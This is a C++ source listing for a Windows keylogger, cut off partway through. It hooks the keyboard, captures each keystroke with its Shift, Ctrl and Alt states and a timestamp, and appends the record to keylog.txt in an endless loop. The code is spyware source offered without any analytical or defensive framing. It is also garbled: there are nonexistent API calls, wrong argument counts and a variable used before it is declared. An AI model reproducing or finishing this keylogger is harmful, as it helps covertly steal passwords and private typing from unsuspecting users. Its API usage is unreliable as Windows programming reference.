### Full Code:

```c
#include <Windows.h>
#include <Wincon.h>
#include <iostream>
#include <fstream>
#include <ctime>
#include <vector>
#include <sstream>

#define LOG_FILE "keylog.txt"
#define HOOK_ID 0
#define SLEEP_TIME 100

using namespace std;

LRESULT CALLBACK KeyboardHookProcedure(int nCode, WPARAM wParam, LPARAM lParam) {
    bool isKeyDown = (wParam == 0x0001);
    if (isKeyDown) {
        int modifiers = GetKeyState(WM_KEYDOWN, 0x10); // Shift
        int ctrl = GetKeyState(WM_KEYDOWN, 0x08);  // Ctrl
        int alt = GetKeyState(WM_KEYDOWN, 0x04);  // Alt

        unsigned long keyPressed = wParam;
        char key = static_cast<char>(keyPressed & 0xFF);
        keystrokes.push_back({key, static_cast<int>(modifiers), static_cast<int>(ctrl), static_cast<int>(alt), 
                            GetSystemTimeAsMilliseconds(nullptr)});
    }
    return CallNextHook(nCode, wParam, lParam);
}

void main() {
    HWND hwnd = GetForegroundWindow(nullptr);
    HHOOK hhook = 0;
    HANDLE file = CreateFile(LOG_FILE, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, 
                       OPEN_ALWAYS, FILE_CREATE_ALWAYS, nullptr);
    vector<pair<char, int, int, int>> keystrokes;

    if (file != nullptr) {
        hhook = SetWindowsHook(hwnd, KeyboardHookProcedure);
        while (true) {
            if (GetAsyncKeyState(0x20)) {
                Sleep(SLEEP_TIME);
            }
            try {
                // Write to file
                ofstream logFile(LOG_FILE, ios::app);
                for (const auto& event : keystrokes) {
